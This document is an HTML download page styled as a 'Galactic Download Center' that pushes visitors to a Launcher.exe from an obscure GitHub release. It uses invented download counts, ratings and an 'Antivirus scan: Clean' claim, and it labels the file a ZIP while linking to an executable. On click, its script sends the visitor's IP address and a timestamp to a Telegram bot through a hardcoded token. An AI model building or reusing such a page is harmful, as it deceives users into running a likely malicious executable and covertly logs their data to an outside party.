<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galactic Download Center</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0c0e2b, #1a1c3d, #2a1b45);
            color: #fff;
            overflow: hidden;
            position: relative;
        }

        #particles-js {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 2;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header Styles */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }

        /* Left-aligned File Info Button */
        .left-header {
            display: flex;
            align-items: center;
        }

        .info-btn {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            padding: 10px 20px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            z-index: 5;
        }

        .info-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .info-btn i {
            margin-right: 8px;
        }

        /* Info Panel */
        .info-panel {
            position: absolute;
            top: 60px;
            left: 0;
            background: rgba(15, 20, 40, 0.9);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(100, 149, 237, 0.4);
            border-radius: 15px;
            padding: 20px;
            width: 300px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            z-index: 10;
            opacity: 0;
            transform: translateY(-10px);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            pointer-events: none;
        }

        .info-btn:hover + .info-panel {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        .info-panel:hover {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        .info-item {
            display: flex;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .info-item:last-child {
            border-bottom: none;
        }

        .info-icon {
            font-size: 20px;
            width: 30px;
            color: #6ab0ff;
        }

        .info-text {
            font-size: 15px;
        }

        /* Right-aligned Auth Buttons */
        .right-header {
            display: flex;
            gap: 15px;
        }

        .auth-btn {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            padding: 10px 25px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            z-index: 5;
        }

        .auth-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .auth-btn#sign-in {
            background: rgba(106, 176, 255, 0.2);
            border: 1px solid rgba(106, 176, 255, 0.4);
        }

        .auth-btn#sign-up {
            background: rgba(163, 77, 255, 0.2);
            border: 1px solid rgba(163, 77, 255, 0.4);
        }

        .auth-btn i {
            margin-right: 8px;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }

        /* Download Button */
        .download-btn {
            background: linear-gradient(45deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            padding: 22px 55px;
            font-size: 1.8rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 10px 35px rgba(102, 51, 255, 0.5);
            z-index: 3;
        }

        .download-btn:hover {
            transform: translateY(-5px) scale(1.05);
            box-shadow: 0 15px 40px rgba(102, 51, 255, 0.8);
        }

        .download-btn:active {
            transform: translateY(0) scale(0.98);
        }

        .download-btn i {
            margin-right: 10px;
        }

        .btn-glow {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: linear-gradient(45deg, #ff00cc, #3333ff, #00ccff);
            opacity: 0;
            z-index: -1;
            filter: blur(25px);
            transition: opacity 0.5s ease;
        }

        .download-btn:hover .btn-glow {
            opacity: 0.7;
        }

        /* Animation for button */
        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
            100% { transform: translateY(0px); }
        }

        .download-btn {
            animation: float 3s ease-in-out infinite;
        }

        /* File Preview */
        .file-preview {
            margin-top: 50px;
            background: rgba(20, 25, 60, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            width: 80%;
            max-width: 600px;
            border: 1px solid rgba(100, 149, 237, 0.3);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .file-title {
            font-size: 1.8rem;
            margin-bottom: 15px;
            color: #a3d0ff;
        }

        .file-description {
            font-size: 1.1rem;
            line-height: 1.6;
            color: #c0d9ff;
        }

        /* Countdown styles */
        .countdown {
            margin-top: 15px;
            font-size: 1.1rem;
            color: #ffcc00;
            font-weight: bold;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .download-btn {
                padding: 18px 45px;
                font-size: 1.5rem;
            }
            
            .info-panel {
                width: 280px;
            }
            
            .file-preview {
                width: 95%;
                padding: 20px;
            }
            
            .auth-btn {
                padding: 8px 15px;
                font-size: 14px;
            }
        }

        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(20, 25, 60, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(100, 149, 237, 0.4);
            border-radius: 10px;
            padding: 15px 20px;
            color: white;
            z-index: 1000;
            transform: translateX(150%);
            transition: transform 0.5s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <!-- Particle container -->
    <div id="particles-js"></div>
    
    <div class="container">
        <header>
            <div class="left-header">
                <button class="info-btn">
                    <i class="fas fa-info-circle"></i>File Information
                </button>
                <div class="info-panel">
                    <div class="info-item">
                        <div class="info-icon">üì•</div>
                        <div class="info-text">Downloads: 2.4 thousand+</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">‚≠ê</div>
                        <div class="info-text">Rating: 4.7/5</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">üîó</div>
                        <div class="info-text">File type: ZIP archive</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">üì¶</div>
                        <div class="info-text">File size: ~105 MB</div>
                    </div>
                    <div class="info-item">
                        <div class="info-icon">üîé</div>
                        <div class="info-text">Antivirus scan: Clean</div>
                    </div>
                </div>
            </div>
            
            <div class="right-header">
                <button class="auth-btn" id="sign-in" onclick="window.location.href='https://github.com'">
                    <i class="fab fa-github"></i>Sign In
                </button>
                <button class="auth-btn" id="sign-up" onclick="window.location.href='https://github.com'">
                    <i class="fas fa-user-plus"></i>Sign Up
                </button>
            </div>
        </header>
        
        <main class="main-content">
            <!-- –î–æ–±–∞–≤–ª–µ–Ω data-redirect-url –¥–ª—è —É–∫–∞–∑–∞–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã -->
            <button class="download-btn" data-redirect-url="https://github.com/silverpick-100ht9/7hco7/releases/download/des/Launcher.exe">
                <span class="btn-glow"></span>
                <i class="fas fa-download"></i>DOWNLOAD NOW
            </button>
            
            <div class="file-preview">
                <h2 class="file-title">Rating: 4.7/5‚≠ê</h2>
                <p class="file-description">
                    Our file has been downloaded over 2.4 thousand times this week        
                    Thank you for supporting us.
                </p>
                <div class="countdown">Redirect in: <span id="countdown">3</span> seconds</div>
            </div>
        </main>
    </div>

    <div class="notification" id="notification">
        <i class="fas fa-bell"></i> <span id="notification-text"></span>
    </div>
    
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <script>
        // Initialize particles.js
        document.addEventListener('DOMContentLoaded', function() {
            particlesJS('particles-js', {
                "particles": {
                    "number": {
                        "value": 180,
                        "density": {
                            "enable": true,
                            "value_area": 900
                        }
                    },
                    "color": {
                        "value": "#ffffff"
                    },
                    "shape": {
                        "type": "circle",
                        "stroke": {
                            "width": 0,
                            "color": "#000000"
                        }
                    },
                    "opacity": {
                        "value": 0.6,
                        "random": true,
                        "anim": {
                            "enable": true,
                            "speed": 1.5,
                            "opacity_min": 0.1,
                            "sync": false
                        }
                    },
                    "size": {
                        "value": 3.5,
                        "random": true,
                        "anim": {
                            "enable": true,
                            "speed": 3,
                            "size_min": 0.1,
                            "sync": false
                        }
                    },
                    "line_linked": {
                        "enable": true,
                        "distance": 160,
                        "color": "#6ab0ff",
                        "opacity": 0.3,
                        "width": 1.2
                    },
                    "move": {
                        "enable": true,
                        "speed": 1.2,
                        "direction": "none",
                        "random": true,
                        "straight": false,
                        "out_mode": "out",
                        "bounce": false,
                        "attract": {
                            "enable": false,
                            "rotateX": 600,
                            "rotateY": 1200
                        }
                    }
                },
                "interactivity": {
                    "detect_on": "canvas",
                    "events": {
                        "onhover": {
                            "enable": true,
                            "mode": "grab"
                        },
                        "onclick": {
                            "enable": true,
                            "mode": "push"
                        },
                        "resize": true
                    },
                    "modes": {
                        "grab": {
                            "distance": 160,
                            "line_linked": {
                                "opacity": 0.8
                            }
                        },
                        "push": {
                            "particles_nb": 6
                        }
                    }
                },
                "retina_detect": true
            });
            
            // Download button functionality with redirect
            const downloadBtn = document.querySelector('.download-btn');
            const countdownElement = document.getElementById('countdown');
            const notification = document.getElementById('notification');
            const notificationText = document.getElementById('notification-text');
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
            function showNotification(message, isSuccess = true) {
                notificationText.textContent = message;
                notification.style.background = isSuccess 
                    ? 'rgba(40, 167, 69, 0.9)' 
                    : 'rgba(220, 53, 69, 0.9)';
                notification.classList.add('show');
                
                setTimeout(() => {
                    notification.classList.remove('show');
                }, 3000);
            }
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram
            async function sendTelegramNotification() {
                try {
                    // –ü–æ–ª—É—á–∞–µ–º IP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —á–µ—Ä–µ–∑ API
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const userIp = ipData.ip;
                    
                    // –ó–¥–µ—Å—å –Ω—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –≤–∞—à Telegram –±–æ—Ç —Ç–æ–∫–µ–Ω –∏ ID —á–∞—Ç–∞
                    const botToken = '7037566053:AAGQEaQs8JtMD6YKA_rs20RkV0LR3zpwwSg'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω
                    const chatId = '7252866418'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à chat ID
                    
                    // –¢–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è
                    const message = `üì• –ù–æ–≤–æ–µ —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ!%0AIP –∞–¥—Ä–µ—Å: ${userIp}%0A–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
                        method: 'POST'
                    });
                    
                    if (response.ok) {
                        showNotification('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!', true);
                    } else {
                        showNotification('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è', false);
                    }
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞:', error);
                    showNotification('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞', false);
                }
            }
            
            downloadBtn.addEventListener('click', function() {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
                sendTelegramNotification();
                
                // Get redirect URL from data attribute
                const redirectUrl = this.getAttribute('data-redirect-url');
                if (!redirectUrl) {
                    alert('Redirect URL is not specified!');
                    return;
                }
                
                // Create a ripple effect
                const ripple = document.createElement('span');
                ripple.classList.add('ripple');
                this.appendChild(ripple);
                
                // Remove ripple after animation
                setTimeout(() => {
                    ripple.remove();
                }, 600);
                
                // Simulate download start
                const originalHTML = downloadBtn.innerHTML;
                downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> DOWNLOADING...';
                downloadBtn.disabled = true;
                
                // Show countdown
                countdownElement.parentElement.style.display = 'block';
                
                // Countdown timer
                let countdown = 3;
                countdownElement.textContent = countdown;
                
                const countdownInterval = setInterval(() => {
                    countdown--;
                    countdownElement.textContent = countdown;
                    
                    if (countdown <= 0) {
                        clearInterval(countdownInterval);
                    }
                }, 1000);
                
                // Redirect after 3 seconds
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 3000);
            });
        });
    </script>
</body>
</html>
